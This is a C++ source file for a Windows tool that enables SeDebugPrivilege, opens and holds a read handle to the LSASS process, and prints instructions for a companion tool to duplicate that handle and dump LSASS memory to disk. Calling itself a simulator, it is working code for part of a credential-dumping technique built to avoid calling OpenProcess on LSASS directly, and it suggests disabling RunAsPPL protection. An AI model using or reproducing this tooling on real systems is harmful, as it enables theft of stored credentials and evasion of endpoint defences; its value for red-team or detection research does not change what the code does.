/*
 * HandleHolder.cpp — Opens and holds a handle to LSASS
 *
 * Many Windows services and security products legitimately maintain
 * open handles to lsass.exe during normal operation. This tool simulates
 * that behavior by opening a handle with PROCESS_QUERY_INFORMATION |
 * PROCESS_VM_READ and keeping it open until the user presses Enter.
 *
 * HandleDup.exe can then discover and duplicate this handle to perform
 * a memory dump — without ever calling OpenProcess on LSASS itself.
 *
 * Build (MinGW x64):
 *   x86_64-w64-mingw32-g++ -o HandleHolder.exe HandleHolder.cpp -static
 *
 * Build (MSVC):
 *   cl /EHsc HandleHolder.cpp
 *
 * Usage (run as Administrator):
 *   HandleHolder.exe
 */

#include <windows.h>
#include <stdio.h>
#include <tlhelp32.h>

DWORD GetLsassPid() {
    HANDLE hSnap = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnap == INVALID_HANDLE_VALUE) return 0;

    PROCESSENTRY32 pe;
    pe.dwSize = sizeof(pe);
    DWORD pid = 0;

    if (Process32First(hSnap, &pe)) {
        do {
            if (_stricmp(pe.szExeFile, "lsass.exe") == 0) {
                pid = pe.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnap, &pe));
    }

    CloseHandle(hSnap);
    return pid;
}

BOOL EnableDebugPrivilege() {
    HANDLE hToken;
    TOKEN_PRIVILEGES tp;

    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
        return FALSE;

    if (!LookupPrivilegeValueA(NULL, "SeDebugPrivilege", &tp.Privileges[0].Luid)) {
        CloseHandle(hToken);
        return FALSE;
    }

    tp.PrivilegeCount = 1;
    tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
    AdjustTokenPrivileges(hToken, FALSE, &tp, sizeof(tp), NULL, NULL);

    BOOL ok = (GetLastError() != ERROR_NOT_ALL_ASSIGNED);
    CloseHandle(hToken);
    return ok;
}

int main() {
    printf("=== HandleHolder — LSASS Handle Simulator ===\n\n");

    if (!EnableDebugPrivilege()) {
        printf("[-] Failed to enable SeDebugPrivilege. Run as Administrator!\n");
        return 1;
    }
    printf("[+] SeDebugPrivilege enabled\n");

    DWORD lsassPid = GetLsassPid();
    if (!lsassPid) {
        printf("[-] Could not find LSASS\n");
        return 1;
    }
    printf("[+] LSASS PID: %lu\n", lsassPid);

    HANDLE hLsass = OpenProcess(
        PROCESS_QUERY_INFORMATION | PROCESS_VM_READ,
        FALSE,
        lsassPid
    );

    if (!hLsass) {
        printf("[-] OpenProcess failed: %lu\n", GetLastError());
        printf("    LSASS may be running as PPL. Try disabling RunAsPPL.\n");
        return 1;
    }

    printf("[+] Opened handle to LSASS: 0x%p\n", hLsass);
    printf("[+] Handle value: 0x%llX\n", (unsigned long long)(ULONG_PTR)hLsass);
    printf("[+] Access: PROCESS_QUERY_INFORMATION | PROCESS_VM_READ (0x%X)\n",
           PROCESS_QUERY_INFORMATION | PROCESS_VM_READ);
    printf("\n[*] Holding handle open. This PID: %lu\n", GetCurrentProcessId());
    printf("[*] Now run HandleDup.exe in another elevated terminal:\n");
    printf("    .\\HandleDup.exe --recon\n");
    printf("    .\\HandleDup.exe --pid %lu --out C:\\Temp\\lsass.dmp\n", GetCurrentProcessId());
    printf("    .\\HandleDup.exe --auto --out C:\\Temp\\lsass.dmp\n");
    printf("\n[*] Press Enter to release handle and exit...\n");

    getchar();

    CloseHandle(hLsass);
    printf("[*] Handle released. Exiting.\n");
    return 0;
}
